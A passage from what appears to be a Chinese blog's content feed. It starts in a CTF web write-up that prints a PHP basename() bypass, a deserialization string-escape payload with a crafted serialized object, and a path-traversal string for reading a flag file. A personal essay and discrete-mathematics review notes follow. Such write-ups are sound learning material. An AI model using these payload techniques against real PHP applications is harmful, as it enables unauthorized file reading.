class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">echo basename($file);</span><br><span class="line">//实例</span><br><span class="line">http://localhost/?file=%ffindex.php/%ff</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=%ffindex.php</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=index.php%ff</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=index.php/%2b</span><br><span class="line">//+</span><br></pre></td></tr></table></figure><p>进入之后是反序列化的源码</p><h3 id="tm-php"><a href="#tm-php" class="headerlink" title="tm.php"></a>tm.php</h3><ul><li>关键是<code>unserialize(object_weakup(object_sleep($user)))</code> ，考点显然是反序列化字符串逃逸，注意<code>chr(0)</code> 是空字符，但是也算一个字节。</li><li>我们自己肯定不会写入不可见字符，所以只利用<ul><li><code>function object_weakup($ob) &#123; $r = str_replace(&#39;@0@0@0@&#39;, chr(0).&#39;*&#39;.chr(0), $ob); return $r; &#125;</code></li><li>一开始短路了想当然的以为以为两个函数都利用，相当于没逃逸，想了半天。。</li></ul></li><li>username传入<code>@0@0@0@</code> ,每传一组就可以逃逸3个字节[字符串减少的情况]，password就传入我们构造好的<code>order</code>类</li><li>其中order类首先是常规方法桡绕过wakeup</li><li>提示hint.php，入口是：<code>@$out = file_get_contents($this-&gt;hint); echo &quot;&lt;br/&gt;&quot;.$out;</code> 进入条件是<code>if (preg_match(&#39;/prankhub$/&#39;, $r[&#39;host&#39;]))</code> 思路就是<code>hint = p5ych://prankhub/</code></li><li>hint.php里面提示flag在<code>f1111444449999.txt</code></li><li>后缀是txt，题目本来有两个地方可以利用，<code>include</code>和 <code>file_get_contents</code> ，但是include后面加了后缀PHP，所以思路是利用<code>file_get_contents</code>。</li><li>因为要求host是<code>prankhub</code> 所以考虑使用伪协议目录穿透到根目录得到flag</li><li>order里面f&#x3D;trypass,hint&#x3D;<code>p5ych://prankhub/../../../../../../../f1111444449999.txt</code></li><li>构造出order：<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;</code></li><li>现在考虑字符串逃逸，username传<code>@0@0@0@</code> ,每传一组就可以逃逸4个字节，我们需要的password是<code>&quot;;s:8:&quot;password&quot;;&quot;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;&quot;;</code></li><li><code>username=&#39;@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&#39;</code></li><li><code>password=&#39;&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;&quot;;&#39;</code></li><li>这里需要注意的是order需要绕过wakeup，<code>&quot;order&quot;:3:&#123;</code> 这里是3.</li><li>password就直接用那个类了，不要前面那个<code>s:122</code>啥的，这个时候我们的password本来传入的string，最后变成Object</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本题考点是：</p><ul><li>basename()函数绕过</li><li>反序列化的字符逃逸</li><li>目录穿越读取flag</li></ul><p>当然重要考点是字符逃逸，主要是需要精心构造还有本地调试，让password是order类，逃逸字符个数要数清楚。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>词不达意</title>
      <link href="/2023/06/15/%E8%AF%8D%E4%B8%8D%E8%BE%BE%E6%84%8F/"/>
      <url>/2023/06/15/%E8%AF%8D%E4%B8%8D%E8%BE%BE%E6%84%8F/</url>
      
        <content type="html"><![CDATA[<p>我总觉得，应该写点什么。文字在屏幕上写了又删删了又写，不知道要说什么，可能那些曾经小心翼翼珍藏的感情也会走到尽头，我很害怕，很多东西好像都变了，不如说，我们都未曾了解过。</p><img src="E:%5C%E7%AC%94%E8%AE%B0%5Cimage%5CQQ%E5%9B%BE%E7%89%8720230615164243.jpg" alt="QQ图片20230615164243" style="zoom: 50%;" /><hr><p>那天我的手串扯断了，珠子一粒一粒的在地上跳动，没有去捡，也捡不回来。当时我在想什么呢，那串石榴石，我戴了很久，中途也断过，甚至掉过，但我还是坚持的重新买一个一样的，会不厌其烦的将已经摔坏的珠子穿串起来，明明打字不方便也还是一直戴着。我知道它戴在我的手上并没有多好看，也没有特殊含义。可我已经认定了，会一直戴着它。但是那天，它断了，捡不回来。大脑一片空白，也许世界上真的没有永远。</p><blockquote><p>没有泪，没有遗憾，继续往前走，故事不会结束。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散_期末复习[战损版]</title>
      <link href="/2023/06/14/%E7%A6%BB%E6%95%A3-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%88%98%E6%8D%9F%E7%89%88/"/>
      <url>/2023/06/14/%E7%A6%BB%E6%95%A3-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%88%98%E6%8D%9F%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-集合论"><a href="#第一章-集合论" class="headerlink" title="第一章_集合论"></a>第一章_集合论</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511151559216-1024x735.png"></p><h5 id="集合的基本概念"><a href="#集合的基本概念" class="headerlink" title="集合的基本概念"></a>集合的基本概念</h5><p><strong>集合</strong>：集合通常是由指定范围内满足给定条件的所有对象聚集在一起构成的。</p><p><strong>元素</strong>：指定范围内的每个对象称为这个集合的元素。<code>将语句&quot;ａ是集合Ａ中的元素&quot;或&quot;ａ属于Ａ&quot;记为 ａ∈Ａ</code></p><p><strong>基数</strong>：将集合中元素的个数称为集合的基数。记为 Ａ。由此把集合分为有限集和无限集</p><hr><h6 id="集合的表示"><a href="#集合的表示" class="headerlink" title="集合的表示"></a>集合的表示</h6><ul><li><p>列举法 例如 A&#x3D;{0,1,2,3};B&#x3D;{0,1,4,9,···,n^2,···}。</p></li><li><p>描述法 记为{xP(x)}   -&gt;x是代表元，P(x)表示x具有性质P<br> 例如   A&#x3D;{xx是’psych’中的所有字母}</p></li><li><p><strong>归纳法</strong>归纳法是通过归纳定义集合的方法，其定义主要有三部分组成：</p><ul><li>第一部分：基础，支出某些最基本的元素属于某集合。</li><li>第二部分：归纳，指出有基本元素造出新元素的方法。</li><li>第三部分：极小性，指出改集合的界限</li></ul><p> 例如，集合A按照如下方式定义：<br> (1)0和1都是A中的元素<br> (2)如果a,b是A中的元素，则ab，ba也是A中的元素<br> (3)有限次使用(1),(2)后所得到的的字符串都是A中的元素<br>  显然-&gt;0,1,00,101等都是A中的元素</p></li><li><p>递归指定集合法 例如：设a(0) &#x3D; 1;a(i+1)&#x3D;3a(i);定义S&#x3D;{a(0),a(1),a(2),…,}&#x3D;{a(k)k∈N}</p></li><li><p>文氏图法:利用平面上的点表示集合中的元素</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511153549306.png"></p><hr><h6 id="集合与集合的关系"><a href="#集合与集合的关系" class="headerlink" title="集合与集合的关系"></a>集合与集合的关系</h6><p>集合中的元素是无序且互异的。</p><p><strong>集合相等</strong>：A和B中的元素完全相同，则A和B这两个集合相等，记为 Ａ ＝ Ｂ。</p><p><strong>子集</strong>：如果B中的每个元素都是A中的元素，则称B是A的子集，也称B被A<strong>包含</strong>(A包含B)，记作<code>Ｂ⊆Ａ</code>.特别的如果B≠A，则A真包含B，即B是A的真子集，记作 <code>Ｂ⊂Ａ</code></p><hr><h6 id="几个特殊集合"><a href="#几个特殊集合" class="headerlink" title="几个特殊集合"></a>几个特殊集合</h6><p><strong>空集</strong>：不含任何元素的集合称为空集，记作⌀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 空集可以表示为： ⌀=&#123;xx≠x&#125;</span><br></pre></td></tr></table></figure><blockquote><p>空集是客观存在的。例如 <code>Ａ＝&#123;ｘｘ∈Ｒ且x^２&lt;０&#125;</code> 就是一个空集</p></blockquote><ul><li>空集是一切集合的子集</li><li>空集是绝对唯一的</li></ul><p>**全集(论集)**：在一个相对固定的范围内，包含此范围内的所有元素的集合，称为全集或者论集。用U或E表示</p><ul><li>全集是相对唯一的。</li></ul><p><strong>集族</strong>：以集合为元素的集合称为集族</p><p><strong>幂集</strong>：设A为任意集合，称A的所有不同子集构成的集合为A的幂集，记作<code>P(A)</code>或 2^Ａ,即 P(A)＝{xx⊆A}。幂集是一个集族</p><blockquote><p>给定一个有限集，作出如下规定：</p><ul><li>称含有n个元素的集合为n元集</li><li>若A为n元集，则称A的含有ｍ个(０≤ｍ≤ｎ)元素的子集为它的 ｍ 元子集。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511155222204.png"></p><hr><h5 id="集合的运算"><a href="#集合的运算" class="headerlink" title="集合的运算"></a>集合的运算</h5><p>总的来说，集合的元素有以下这几种基本运算：并运算，交运算，差运算，补运算，对称差运算</p><ul><li>Ａ∪Ｂ -&gt; 取A与B的并集，为<strong>并运算</strong>，符号为<code>∪</code></li><li>Ａ∩Ｂ -&gt; 取A与B的交集，为<strong>交运算</strong>，符号为<code>∩</code></li><li>Ａ-Ｂ -&gt; 取A与B的差集，为<strong>差运算</strong>，符号为<code>-</code>特别的如果A&#x3D;U，即A是全集是，A-B又称为集合B的补集，运算为<strong>补运算</strong>。</li><li>Ａ⊕Ｂ&#x3D;(Ａ-Ｂ)∪(Ｂ-Ａ) -&gt;取A中除开B的部分加上B中除开A的部分，为<strong>对称差运算</strong>，符号为<code>⊕</code> 文氏图为：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511160827870.png"></p><p>一些运算公式：（看看得了）</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511160901329-1024x483.png"></p><h5 id="无限集"><a href="#无限集" class="headerlink" title="无限集"></a>无限集</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000438923-1024x286.png"></p><h5 id="与集合相关的应用"><a href="#与集合相关的应用" class="headerlink" title="与集合相关的应用"></a>与集合相关的应用</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000511057-1024x193.png"></p><hr><h2 id="第二章-命题逻辑"><a href="#第二章-命题逻辑" class="headerlink" title="第二章_命题逻辑"></a>第二章_命题逻辑</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511163353840.png"></p><hr><h5 id="命题与命题联结词"><a href="#命题与命题联结词" class="headerlink" title="命题与命题联结词"></a>命题与命题联结词</h5><h6 id="命题"><a href="#命题" class="headerlink" title="命题"></a>命题</h6><p>定义：能够判断真假的陈述句称为命题。称’真’和’假’为命题的真值，用’T’(1)和’F’(0)表示。</p><p>判断：一个语句是命题，当且仅当它是陈述句且有明确的真值。</p><h6 id="命题联结词"><a href="#命题联结词" class="headerlink" title="命题联结词"></a>命题联结词</h6><p><strong>原子命题</strong>：不能再分解为更简单命题的命题，称为原子命题。</p><p><strong>命题联结词</strong>：像“或者”这种联结命题的关键词，称为命题联结词。</p><p><strong>复合命题</strong>：有命题联结词联结原子命题而形成的命题称为复合命题</p><p>最常见的语句间的关系主要有一下5种：</p><ul><li>表示<strong>否定</strong>关系的:’不’，’非’，’否’… –&gt;否定联结词</li><li>表示<strong>并列</strong>关系的:’并且’，’和’，’即…，又…’ –&gt;合取联结词</li><li>表示<strong>选择</strong>关系的:’…或者…’，’…或…’ –&gt;析取联结词</li><li>表示<strong>条件</strong>关系的:’如果…，则…’，’如果…，那么…’ –&gt;蕴含联结词</li><li>表示<strong>等价</strong>关系的:’…当且仅当…’ –&gt;等价联结词</li></ul><h6 id="自然语言的命题符号化"><a href="#自然语言的命题符号化" class="headerlink" title="自然语言的命题符号化"></a>自然语言的命题符号化</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511171540705.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511171545675.png"></p><p><strong>真值表</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511170525473-1024x283.png"></p><blockquote><p>蕴含： 100,其他全部为1</p><p>等价： 相同为真，不同为假</p></blockquote><h6 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h6><p>所有五个联接词的优先顺序为：否定，合取，析取，蕴涵，等价；</p><hr><h5 id="命题公式，解释与真值表"><a href="#命题公式，解释与真值表" class="headerlink" title="命题公式，解释与真值表"></a>命题公式，解释与真值表</h5><h6 id="命题公式"><a href="#命题公式" class="headerlink" title="命题公式"></a>命题公式</h6><p>原子命题又被称作<strong>命题常量</strong>或<strong>常值命题</strong>，而其他P,Q,R等通常(真值可变)被称为<strong>命题变量</strong>或<strong>命题变元</strong>。命题公式诸如<code>¬ (Ｐ∧Ｑ)→¬ Ｒ</code> 又被称为 P, Q 和R的真值函数。常被记为Ｇ(Ｐ,Ｑ,Ｒ)</p><h6 id="命题公式的解释与真值表"><a href="#命题公式的解释与真值表" class="headerlink" title="命题公式的解释与真值表"></a>命题公式的解释与真值表</h6><p>我们进行如下定义：</p><ul><li>公式G的真值全为’真’，则称公式G为<strong>永真公式(重言式)</strong></li><li>公式G的真值全为’假’，则称公式G为<strong>永假公式(矛盾式)</strong></li><li>公式G的真值至少存在一个为’真’，则称公式G为<strong>可满足公式</strong></li></ul><p>如果题目要求_判断公式的类型_，就是让我们化简，看公式是重言式还是矛盾式还是可满足公式···</p><h6 id="命题公式的基本等价定律"><a href="#命题公式的基本等价定律" class="headerlink" title="命题公式的基本等价定律"></a>命题公式的基本等价定律</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511181436055.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511181447825.png"></p><hr><h5 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h5><p>对于任意的命题公式，是否有一个唯一的，标准的表示形式呢？这就是范式要解决的问题。</p><h6 id="联结词的完备集"><a href="#联结词的完备集" class="headerlink" title="联结词的完备集"></a>联结词的完备集</h6><p>括号组成的有限长度的符号串， 又可以知道“→”和“↔”可用“¬ ” “∧”和“∨”等价表示。因此，可以 说任何命题公式都可以由“¬ ”“∧”和“∨”这 ３ 个联结词来等价表示。称这 ３ 个联结词构成的集合{¬ ， ∧， ∨}为<strong>联结词的完备集</strong>。</p><p>给出定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 设S,T是任意联结词集合。</span><br><span class="line"> (1)如果任意一个命题公式都可以用S中的联结词进行等价表示，则称S是联结词的完备集</span><br><span class="line"> (2)设S是一个联结词的完备集且 Ｔ⊂Ｓ。如果至少存在一个命题公式不能用T中的联结词进行等价表示，则称S为#极小联结词的完备集#</span><br><span class="line">     补：极小联结词的完备集还有&#123;¬ ，∨&#125;</span><br></pre></td></tr></table></figure><h6 id="析取范式和和取范式"><a href="#析取范式和和取范式" class="headerlink" title="析取范式和和取范式"></a>析取范式和和取范式</h6><p>理论上，选用不同的联结完备词可以更加方便的对命题公式进行研究。但是同一个命题公式用不同的联结完备词就会得到不同的表达式，这给研究带来了不便。</p><p>我们着重研究用联结完备词：{¬ ， ∧， ∨}表示的命题公式的标准形式——<strong>范式</strong>。</p><p>下面先将一些概念：</p><ul><li><strong>文字</strong>：称命题变元或者命题变元的否定为文字</li><li><strong>合取式或短语</strong>：如果一个命题具有形式式 Ａ１∧Ａ２∧…∧Ａｎ(ｎ≥１)。其中 Ａｉ(ｉ ＝ １， ２，…，ｎ)是文字， 则称该命题公式为合取式或短语。</li><li><strong>析取式或字句</strong>：如果一个命题公式具有形式 Ａ１∨Ａ２∨…∨Ａｎ(ｎ≥１)。其中 Ａｉ(ｉ ＝ １， ２，…，ｎ)是文字， 则称该命题公式为析取式或字句。</li><li><strong>合取范式</strong>：如果一个命题具有形式式 Ａ１∧Ａ２∧…∧Ａｎ(ｎ≥１)。其中 Ａｉ(ｉ ＝ １， ２，…，ｎ)是析取式， 则称该命题公式为合取范式。</li><li><strong>析取范式</strong>：如果一个命题公式具有形式 Ａ１∨Ａ２∨…∨Ａｎ(ｎ≥１)。其中 Ａｉ(ｉ ＝ １， ２，…，ｎ)是合取式， 则称该命题公式为析取范式。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230515110347794.png"></p><p>计算合取范式，析取范式：</p><ul><li>用“¬ ”“∧”和“∨”等价替换掉“→”和“↔”</li><li>利用双重否定律消去多余的否定联结词，德摩根律将否定联结词内移</li><li>利用分配率，结合律，幂等律等整理得到对应的析取范式和合取范式</li></ul><p>有一个小技巧：得到析取范式后可以直接转换得到合取范式  </p><p>        (¬Ｐ∧¬Ｑ)∨(Ｐ∧Ｑ)∨Ｒ<br>                 <br>  (¬ Ｐ∨Ｐ∨Ｒ)∧(¬ Ｐ∨Ｑ∨Ｒ)∧(¬ Ｑ∨Ｐ∨Ｒ)∧(¬ Ｑ∨Ｑ∨Ｒ)</p><h6 id="主合取范式和主析取范式"><a href="#主合取范式和主析取范式" class="headerlink" title="主合取范式和主析取范式"></a>主合取范式和主析取范式</h6><p><strong>极大项和极小项</strong></p><p>定义：在含有n个命题变元的合&#x2F;析取式中，如果每个命题变元与其否定不同时存在，但二者之一恰好出现且仅出现一次，则称这个合&#x2F;析取式为关于这n个命题变元的一个极大&#x2F;小项。</p><p> 极大项    -&gt;     析取式<br> 极小项    -&gt;     合取式</p><p><strong>编码规则</strong></p><p>极大项的编码规则：命题变元极其否定对应 0和 1</p><p>极小项的编码规则：命题变元极其否定对应 1 和 0</p><p><strong>主合取范式和主析取范式</strong></p><ul><li><strong>主合取范式</strong>：一个命题公式具有形式：Ａ1∧Ａ2∧…∧Ａn(ｎ≥１)，其中Ai是极大项，则称改命题公式为主合取范式</li><li><strong>主析取范式</strong>：一个命题公式具有形式：Ａ1∨Ａ2∨…∨Ａ3(ｎ≥１)，其中Ai是极小项，则称该命题公式为主析取范式。</li></ul><p>主合&#x2F;析取范式的计算方法</p><ul><li>先计算出合取范式或析取范式</li><li>将析取&#x2F;合取范式中的每一个式子变成极大项&#x2F;极小项</li><li><strong>小技巧：Ｐ＝Ｐ∧１＝Ｐ∧(¬ Ｑ∨Ｑ)；Ｐ＝Ｐ∨０＝Ｐ∨(¬ Ｑ∧Ｑ)</strong></li><li>利用幂等律将相同的极大&#x2F;极小项合并，同时利用交换律进行顺序调整，从而得到主&#x2F;合取范式。</li></ul><hr><h5 id="命题逻辑的推理理论"><a href="#命题逻辑的推理理论" class="headerlink" title="命题逻辑的推理理论"></a>命题逻辑的推理理论</h5><h6 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h6><p><strong>定义</strong>：设 Ｇ１，Ｇ２，···，Ｇｎ ， Ｈ 是命题公式。对任意解释 I，如果 Ｇ１∧Ｇ２∧···∧Ｇｎ为真， Ｈ 也为真。或者 Ｇ１∧Ｇ２∧，∧Ｇｎ为 假， 则称 Ｈ 是 Ｇ１ ，Ｇ２ ，···，Ｇｎ的逻辑结果(Logic Conclution)。 或者 Ｇ１ ，Ｇ２ ，···，Ｇｎ共同蕴涵 Ｈ。 记为 Ｇ１ ，Ｇ２ ，···，Ｇｎ⇒Ｈ。</p><p><strong>定理2.6</strong>： 公式 Ｈ 是前提集合{Ｇ１，Ｇ２，···，Ｇｎ }的逻辑结果当且仅当 Ｇ１∧Ｇ２∧···∧Ｇｎ→Ｈ 为永真公式。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607184151184-1024x240.png"></p><h6 id="判别方法"><a href="#判别方法" class="headerlink" title="判别方法"></a>判别方法</h6><p><strong>真值表技术</strong>：构造真值表，配合定理2.6去判断 (<strong>→</strong>)</p><p><strong>等价公式转换法</strong>：</p><ul><li>合取所有前提作为蕴含式的前件，结论作为蕴含式的后件</li><li>化简这个蕴含式</li><li>如果化简结果为1，则推理有效，否则推理无效。</li></ul><p><strong>演绎法</strong>：从前提(假设)出发，依据公认的推理规则和推理定律导出结论的方法。</p><blockquote><p>为了正确地使用演绎法去判定推理的有效性，还需要了解<strong>推理定律</strong>和<strong>推理规则</strong></p></blockquote><p>_推理定律_：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607185138322-1024x411.png"></p><p>_推理规则_：</p><p>（1）<strong>P规则</strong>(Premise前提引用规则) 在推理过程中，如果引入前提集合中的一个 前提， 则称使用了P规则</p><p>（2）<strong>T 规则</strong>(Transformation， 逻辑结果引用规则) 在推理过程中，如果引入推理过程中产生的某个中间结果，则称使用了T规则。</p><p>（3）)<strong>CP规则</strong>(Conclusion premise，附加前提规则) 在推理过程中，如果逻辑结果为蕴涵式， 并且将该蕴涵式的前件作为前提引入，则称使用了CP规则。</p><p>还有一个消解原理，不太会，有人说不怎么要求，就不整理了。。</p><blockquote><p>事实上，消解原理就是反证法的一种形式</p></blockquote><p>① Ｐ∨¬ Ｒ Ｐ</p><p>② Ｒ Ｐ</p><p>③ Ｐ Ｔ， ①， ②， <strong>消解原理</strong></p><hr><h5 id="命题逻辑的应用"><a href="#命题逻辑的应用" class="headerlink" title="命题逻辑的应用"></a>命题逻辑的应用</h5><h6 id="命题联结词的应用"><a href="#命题联结词的应用" class="headerlink" title="命题联结词的应用"></a>命题联结词的应用</h6><p><strong>计算机中的比特运算</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000615736-1024x109.png"></p><p>需要注意的就是XOR指的是异或(不可兼或)。</p><p><strong>web搜索</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214719154.png"></p><h6 id="命题公式的应用"><a href="#命题公式的应用" class="headerlink" title="命题公式的应用"></a>命题公式的应用</h6><p>化简电路，化简程序图</p><p>e.g:</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214930918.png"></p><p>用命题公式化简其对应的电路：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607214941287.png"></p><hr><h2 id="第三章-谓词逻辑"><a href="#第三章-谓词逻辑" class="headerlink" title="第三章_谓词逻辑"></a>第三章_谓词逻辑</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607215109808-1024x604.png"></p><hr><h5 id="自然语言的谓词符号化"><a href="#自然语言的谓词符号化" class="headerlink" title="自然语言的谓词符号化"></a>自然语言的谓词符号化</h5><h6 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h6><p>在原子命题中，可以独立存在的客体(句子中的主语、 宾语等)称为<strong>个体词</strong>(Individual)。 用以刻画客体性质或客体之间关系的部分称为<strong>谓词</strong>(Predicate)。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607215920531-1024x221.png"></p><p><strong>定义</strong>：设 Ｐ(X1，X2 ，···，Xn )是定义在 Ｄｎ上的ｎ元函数。其中Ｄ为非空的个体域，如果Ｐ(X1，X2 ，···，Xn )的值域是{0,1}。则称Ｐ(X1，X2 ，···，Xn )为n元命题函数或n元谓词 (Propositional Function）。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607220640742-1024x144.png"></p><h6 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000640593-1024x155.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607221527437-1024x217.png"></p><hr><h5 id="谓词公式和解释"><a href="#谓词公式和解释" class="headerlink" title="谓词公式和解释"></a>谓词公式和解释</h5><h6 id="自由变元和约束变元"><a href="#自由变元和约束变元" class="headerlink" title="自由变元和约束变元"></a>自由变元和约束变元</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000705497-1024x93.png"></p><h6 id="谓词公式的解释"><a href="#谓词公式的解释" class="headerlink" title="谓词公式的解释"></a>谓词公式的解释</h6><p>在任意给定的解释I下，如果谓词公式G的取值全部为真，则称G为<strong>永真公式</strong>，如果全部为假则为<strong>永假公式</strong>。如果存在有真，就是<strong>可满足公式</strong>。</p><hr><h5 id="谓词公式的标准型——前束范式"><a href="#谓词公式的标准型——前束范式" class="headerlink" title="谓词公式的标准型——前束范式"></a>谓词公式的标准型——前束范式</h5><p>设G,H是谓词公式，如果谓词公式G&lt;-&gt;H是永真公式，那么称G,H是等价的，记作G&#x3D;H</p><hr><h5 id="谓词逻辑的推理理论"><a href="#谓词逻辑的推理理论" class="headerlink" title="谓词逻辑的推理理论"></a>谓词逻辑的推理理论</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607235615560.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230607235642026.png"></p><hr><h5 id="谓词公式的标准型——前束范式-1"><a href="#谓词公式的标准型——前束范式-1" class="headerlink" title="谓词公式的标准型——前束范式"></a>谓词公式的标准型——前束范式</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608000512066-1024x381.png"></p><p>前束范式并不唯一</p><hr><h5 id="谓词逻辑的应用"><a href="#谓词逻辑的应用" class="headerlink" title="谓词逻辑的应用"></a>谓词逻辑的应用</h5><h6 id="推理规则"><a href="#推理规则" class="headerlink" title="推理规则"></a>推理规则</h6><ul><li>消去量词规则<ul><li>UI(全称量词消去)规则任意ｘＧ(ｘ)⇒Ｇ(ｙ) 其中Ｇ(ｘ)对ｙ是自由的。或者 ｘＧ(ｘ)⇒Ｇ(ｃ) 其中 ｃ 为任意个体常量</li><li>EI(存在量词消去)规则存在ｘＧ(ｘ)⇒Ｇ(ｃ) 其中ｃ为使Ｇ(ｃ)为真的特定个体常量</li></ul></li><li>引入量词规则<ul><li>ＵＧ(全称量词引入)规则Ｇ(ｘ)⇒任意ｙＧ(ｙ) 其中 Ｇ(ｘ)对于 ｙ 是自由的</li><li>ＥＧ(存在量词引入)规则Ｇ(ｃ)⇒存在ｘＧ(ｘ) 其中ｃ为特定个体常量或者 Ｇ(ｘ)⇒存在ｙＧ(ｙ) 其中 Ｇ(ｘ)对于ｙ是自由的</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609172049815-1024x309.png"></p><h6 id="推理定律"><a href="#推理定律" class="headerlink" title="推理定律"></a>推理定律</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609172112678-1024x326.png"></p><hr><h2 id="第四章-二元关系"><a href="#第四章-二元关系" class="headerlink" title="第四章_二元关系"></a>第四章_二元关系</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173101772-1024x572.png"></p><hr><h5 id="二元关系及其表示"><a href="#二元关系及其表示" class="headerlink" title="二元关系及其表示"></a>二元关系及其表示</h5><p><strong>二元关系的定义</strong>：由两个元素ｘ，ｙ按照一定的次序组成的二元组被称为有序偶对，简称序偶。 记作‹ｘ，ｙ›， 读作“序 偶 ｘ，ｙ”。其中称ｘ为‹ｘ，ｙ›的第一元素，ｙ为‹ｘ，ｙ›的第二元素。</p><p>推广序偶的思想，可以定义任意ｎ个元素的有序序列：由ｎ个元素a１，ａ２，···，ａｎ按照一定次序组成的ｎ元组被称为<strong>ｎ重有序组</strong>，记作‹ａ１ ，ａ２，···，ａｎ›。</p><p>将序偶与集合联系起来， 可以得到笛卡儿积的定义：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173626678-1024x153.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173651637-1024x266.png"></p><h6 id="笛卡尔积的运算"><a href="#笛卡尔积的运算" class="headerlink" title="笛卡尔积的运算"></a>笛卡尔积的运算</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609174538092.png"></p><p>注意：空集×任何子集&#x3D;&#x3D;空集</p><p><strong>·</strong></p><p><strong>·</strong></p><p><strong>·</strong></p><hr><h2 id="第六章-图"><a href="#第六章-图" class="headerlink" title="第六章_图"></a>第六章_图</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608184416367-1024x568.png"></p><hr><h5 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h5><h6 id="图的定义"><a href="#图的定义" class="headerlink" 